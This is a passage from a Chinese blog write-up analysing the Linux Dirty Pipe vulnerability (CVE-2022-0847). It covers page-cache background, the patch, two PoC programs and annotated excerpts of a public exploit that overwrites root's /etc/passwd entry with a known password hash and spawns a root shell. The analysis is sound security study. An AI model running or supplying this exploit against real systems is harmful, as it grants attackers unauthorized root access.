class="line">$ dd if=/dev/urandom of=sync.txt bs=64M count=16 iflag=fullblock oflag=sync</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 13.2175 s, 81.2 MB/s</span><br></pre></td></tr></table></figure><p>page cache除了可以提升和硬盘交互性能外，下面继续讨论page cache功能。</p><h4 id="1、如果程序crash，异步模式会丢失数据吗？"><a href="#1、如果程序crash，异步模式会丢失数据吗？" class="headerlink" title="1、如果程序crash，异步模式会丢失数据吗？"></a>1、如果程序crash，异步模式会丢失数据吗？</h4><p>比如存在这样的场景：一批数据已经成功写入到page cache，这时程序突然crash，但是在page cache里的数据还没来得及被pdflush写回到硬盘，这批数据会丢失吗？<br>答案是，要看具体情况：</p><ol><li>如果OS没有crash或者重启的话，仅仅是写数据的程序crash，那么已经成功写入到page cache中的dirty pages是会被pdflush在合适的时机被写回到硬盘，不会丢失数据；</li><li>如果OS也crash或者重启的话，因为page cache存放在内存中，一旦断电就丢失了，那么就会丢失数据。<br>至于这种情况下，会丢失多少数据，主要看系统重启前有多少dirty pages被写入到硬盘，已经成功写回硬盘的就不会丢失；没来得急写回硬盘的数据就彻底丢失了。这也是异步写硬盘的一个潜在风险。<br>同步写硬盘时就不存在这种丢数据的风险。同步写操作返回成功时，能保证数据一定被保存在硬盘上了。</li></ol><p>引用RocksDB wiki中关于“<a class="link"   href="https://github.com/facebook/rocksdb/wiki/Basic-Operations#asynchronous-writes" >Asynchronous Writes<i class="fas fa-external-link-alt"></i></a>”描述：</p><blockquote><p>Asynchronous writes are often more than a thousand times as fast as synchronous writes. The downside of asynchronous writes is that a crash of the machine may cause the last few updates to be lost. Note that a crash of just the writing process (i.e., not a reboot) will not cause any loss since even when sync is false, an update is pushed from the process memory into the operating system before it is considered done.</p></blockquote><p>那么如何避免因为系统重启或者机器突然断电，导致数据丢失问题呢？<br>可以借助于WAL（Write-Ahead Log）技术。</p><p>WAL技术在数据库系统中比较常见，在数据库中一般又称之为redo log，Linux 文件系统ext3/ext4称之为journaling。WAL作用是：写数据库或者文件系统前，先把相关的metadata和文件内容写入到WAL日志中，然后才真正写数据库或者文件系统。WAL日志是append模式，所以，对WAL日志的操作要比对数据库或者文件系统的操作轻量级得多。如果对WAL日志采用同步写模式，那么WAL日志写成功，即使写数据库或者文件系统失败，可以用WAL日志来恢复数据库或者文件系统里的文件。</p><h4 id="2、查看一个文件占用page-cache情况"><a href="#2、查看一个文件占用page-cache情况" class="headerlink" title="2、查看一个文件占用page cache情况"></a>2、查看一个文件占用page cache情况</h4><p>可以借助于<a class="link"   href="https://hoytech.com/vmtouch/" >vmtouch<i class="fas fa-external-link-alt"></i></a>工具：</p><blockquote><p>vmtouch is a tool for learning about and controlling the file system cache of unix and unix-like systems.</p></blockquote><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329165324080.png" alt="image-20220329165324080"></p><h4 id="3、一些注意点"><a href="#3、一些注意点" class="headerlink" title="3、一些注意点"></a>3、一些注意点</h4><p>由于缓存页面可以很容易地被驱逐和重用，一些操作系统，特别是<a class="link"   href="https://en.wikipedia.org/wiki/Windows_NT" >Windows NT<i class="fas fa-external-link-alt"></i></a>，甚至将页面缓存使用情况报告为“可用”内存，而内存实际上是分配给磁盘页面的。这导致了一些关于在 Windows 中使用页面缓存的混乱。</p><p>cache也容易产生测信道攻击，由于page cache与磁盘文件有pdflush措施，一般磁盘文件都有着严格的权限分离措施，所以page cache可能存在某些文件页面可以绕过权限分离并泄露有关其他进程的数据。这里的内容比较多，就不展开了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="零、前言"><a href="#零、前言" class="headerlink" title="零、前言"></a>零、前言</h3><p>漏洞分析要养成一种由已知到未知的分析习惯，我们分析漏洞时，参考其他师傅的文章时，要想明白分析的具体思路是什么，具体的解决方法是什么。</p><p>实际上该漏洞归纳的分析思路大致为：补丁对比-&gt;漏洞验证-&gt;前置知识了解-&gt;漏洞调试-&gt;exp分析。这是一个不断探索的过程，每一步的操作都是为下一步做铺垫，补丁对比的意义在于简单了解漏洞点，漏洞验证帮助我们了解这个漏洞是长什么样子，他能造成什么后果（文件写入，代码注入，信息泄露等等）；前置知识了解帮助我们了解函数功能或者系统运作方式等等知识，为分析漏洞打好基础；漏洞调试帮助我们完全理解漏洞成因；exp分析帮助我们了解漏洞的利用方式。</p><p>我们按照这个顺序进行漏洞分析。</p><h3 id="一、补丁分析"><a href="#一、补丁分析" class="headerlink" title="一、补丁分析"></a>一、补丁分析</h3><p>漏洞补丁<a class="link"   href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/" >如下<i class="fas fa-external-link-alt"></i></a></p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328160733330.png" alt="image-20220328160733330"></p><p>可见补丁对<code>buf-&gt;flags</code>进行了初始化，可以推断经过漏洞的影响，<code>buf-&gt;flags</code>必不为0！</p><p>目前我们不清楚<code>buf-&gt;flags</code>到底代表了什么含义。我们将带着这个问题进行源码分析。</p><h3 id="二、splice读写文件实验"><a href="#二、splice读写文件实验" class="headerlink" title="二、splice读写文件实验"></a>二、splice读写文件实验</h3><p>这里参考了漏洞发现者与ghost461师傅的文章，实验的内容为，编写两个程序，第一个程序对一个文件写入A，之后第二个程序调用splice函数将文件内容读取到管道，之后对管道写入B。发现执行完第一个程序时的文件内容全为A，而第二个程序执行后，文件内容里面竟然包含了B，明明第二个程序并没有写文件的操作。</p><p>下面的代码参考自ghost461的文章：</p><p>poc1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* path = <span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(path,O_WRONLY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">write</span>(fd, <span class="string">&quot;AAAAA&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;title\n&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* path = <span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(path, O_RDONLY);</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(p)) <span class="built_in">abort</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = <span class="built_in">fcntl</span>(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line">    <span class="built_in">write</span>(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line">    <span class="built_in">read</span>(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nbytes = <span class="built_in">splice</span>(fd, <span class="number">0</span>, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">    nbytes = <span class="built_in">write</span>(p[<span class="number">1</span>], <span class="string">&quot;BBBBB&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行程序poc1</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328175234758.png" alt="image-20220328175234758"></p><p>执行程序poc2</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329142848335.png" alt="image-20220329142848335"></p><p>可见我们没有对文件进行写，但文件中仍然存在我们输入到管道中的BBBBB</p><p>重启后查看tmpfile文件</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328175234758.png" alt="image-20220328175234758"></p><p>重启后，B消失了，可见我们写入管道的BBBBB并没有真正的写入进文件中，而是写入了一块临时的内存空间中。</p><h3 id="三、动态分析"><a href="#三、动态分析" class="headerlink" title="三、动态分析"></a>三、动态分析</h3><p>我们在关键函数<code>pipe_wirte</code>与<code>copy_page_to_iter_pipe</code>下断点</p><p>由于在poc代码中先完成了一段填满管道再将管道清空的操作，在填满管道的过程中会触发<code>pipe_write</code>函数，且在某个else分支会将<code>buf-&gt;flags</code>赋值为<code>PIPE_BUF_FLAG_CAN_MERGE</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">is_packetized</span>(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<span class="comment">// PIPE_BUF_FLAG_PACKET == 0x8</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<span class="comment">// PIPE_BUF_FLAG_CAN_MERGE == 0x10</span></span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329151119554.png" alt="image-20220329151119554"></p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329150405704.png" alt="image-20220329150405704"></p><p>在经过多次命中<code>pipe_write</code>函数后，命中了<code>copy_page_to_iter_pipe</code>函数，在对<code>pipe buf</code>做初始化操作时并没有对<code>buf-&gt;flags</code>进行初始化，导致现在的<code>buf-&gt;flags</code>仍然是<code>0x10</code>，也就是<code>PIPE_BUF_FLAG_CAN_MERGE</code>。</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329150704210.png" alt="image-20220329150704210"></p><p>在splice系统调用后面的系统调用即为write，文件描述符传的是pipe的文件描述符，此时跟进<code>pipe_write</code>，进入该if分支，此时chars代表的字符数表示write函数传入的第二个参数。</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329151436524.png" alt="image-20220329151436524"></p><p>poc中如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;</span>; <span class="comment">// openssl passwd -1 -salt aaron aaron </span></span><br><span class="line">nbytes = <span class="built_in">write</span>(p[<span class="number">1</span>], data, data_size);</span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329151643307.png" alt="image-20220329151643307"></p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329152706101.png" alt="image-20220329152706101"></p><p>下面会判断<code>buf-&gt;flags</code>是否置位<code>PIPE_BUF_FLAG_CAN_MERGE</code>，如果是，则将文件内容<code>write</code>进管道。</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329153054612.png" alt="image-20220329153054612"></p><p>至此就是整体的漏洞流程。</p><h3 id="四、exp分析"><a href="#四、exp分析" class="headerlink" title="四、exp分析"></a>四、exp分析</h3><p>这里分析的是最先公开的<a class="link"   href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c" >exp代码<i class="fas fa-external-link-alt"></i></a>，我们尽量从已知来推断未知，代码用了大量的校验代码，在漏洞复现或利用时帮助我们精准的判断问题出在了哪里。</p><p>首先备份原始的passwd，因为我们的修改会使其内容发生变化。再完成提权后，我们可以选择将这个备份后的passwd.bak文件再还原回去，尽量不露痕迹，或者在测试时可以还原现场。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FILE *f1 = <span class="built_in">fopen</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">FILE *f2 = <span class="built_in">fopen</span>(<span class="string">&quot;/tmp/passwd.bak&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">while</span> ((c = <span class="built_in">fgetc</span>(f1)) != EOF)</span><br><span class="line"><span class="built_in">fputc</span>(c, f2);</span><br><span class="line"><span class="built_in">fclose</span>(f1);</span><br><span class="line"><span class="built_in">fclose</span>(f2);</span><br></pre></td></tr></table></figure><p>之后创建管道，首先填满管道，这时<code>pipe_write</code>将<code>buf-&gt;flags</code>的<code>PIPE_BUF_FLAG_CAN_MERGE</code>位设置为1，之后清空管道，方便下一次poc的写入。此时该管道为空，且其缓冲区设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，下次操作管道描述符时不会创建新的page，而是仍然使用原有的page进行操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pipe</span>(p)) <span class="built_in">abort</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = <span class="built_in">fcntl</span>(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line"><span class="built_in">write</span>(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">leaving the flags initialized) */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line"><span class="built_in">read</span>(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">will be mergeable */</span></span><br></pre></td></tr></table></figure><p>之后触发漏洞。首先调用了<code>splice</code>将<code>file page</code>与<code>pipe buf</code>关联起来，之后<code>write</code>会调用<code>pipe_write</code>函数，判断<code>buf-&gt;flags</code>如果<code>PIPE_BUF_FLAG_CAN_MERGE</code>已置为，那么会直接操作<code>pipe buf</code>，也相当于操作了<code>file page</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">loff_t</span> offset = <span class="number">4</span>; <span class="comment">// after the &quot;root&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;</span>; <span class="comment">// openssl passwd -1 -salt aaron aaron </span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"><span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> fd = <span class="built_in">open</span>(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">--offset;</span><br><span class="line"><span class="keyword">ssize_t</span> nbytes = <span class="built_in">splice</span>(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">nbytes = <span class="built_in">write</span>(p[<span class="number">1</span>], data, data_size);</span><br></pre></td></tr></table></figure><p>此时可以当作root密码已经被修改，最终弹出shell</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;(echo aaron; cat) | su - -c \&quot;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;cp /tmp/passwd.bak /etc/passwd;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;/bin/sh;&quot;</span></span><br><span class="line">            <span class="string">&quot;\&quot; root&quot;</span>&#125;;</span><br><span class="line">        <span class="built_in">execv</span>(<span class="string">&quot;/bin/sh&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行的是下面的命令</span></span><br><span class="line"><span class="comment">// /bin/sh -c &quot;(echo aaron; cat) | su - -c \&quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;cp /tmp/passwd.bak /etc/passwd;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;/bin/sh;\&quot; root&quot;</span></span><br></pre></td></tr></table></figure><h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>我们会发现如果了解前置知识后理解该漏洞竟是如此的简单，但是该漏洞的挖掘仍然是比较困难的，需要对splice和pipe等的这整块的内容熟悉，漏洞发现者也是在业务中发现了业务有些许异常才发现该漏洞。</p><p>该漏洞的利用也很有意思，首先是<code>buf-&gt;flags</code>没有初始化，从而找到了<code>pipe_write</code>函数对<code>PIPE_BUF_FLAG_CAN_MERGE</code>的操作，本来这样无关痛痒，只是可以随意覆写管道，但是由于page cache的存在，令我们随意覆写管道转换成随意覆写文件，后面想到可以覆写/etc/passwd，最终达到提权的目的，实际上该漏洞也可以覆写其他文件，提权只是该漏洞的一种表现形式。如<a class="link"   href="https://haxx.in/files/dirtypipez.c" >该方法<i class="fas fa-external-link-alt"></i></a>就是利用了覆盖SUID文件</p><p>其他文章也提到过，由于调用<code>splice</code>函数需要对文件有读权限，如果没有读权限，那么该漏洞就无法利用了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a class="link"   href="https://dirtypipe.cm4all.com/" >漏洞发现者的博客<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/4714867?fr=aladdin" >标准输入输出百度百科<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://www.anquanke.com/post/id/269886" >360 Nitro师傅的分析<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://segmentfault.com/a/1190000009528245" >pipe原理<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://man7.org/linux/man-pages/man2/splice.2.html" >splice man手册<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://juejin.cn/post/6995519558475841550" >零拷贝的原理<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://en.wikipedia.org/wiki/Direct_memory_access" >DMA维基百科<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://www.cnblogs.com/xiaolincoding/p/13719610.html" >原来 8 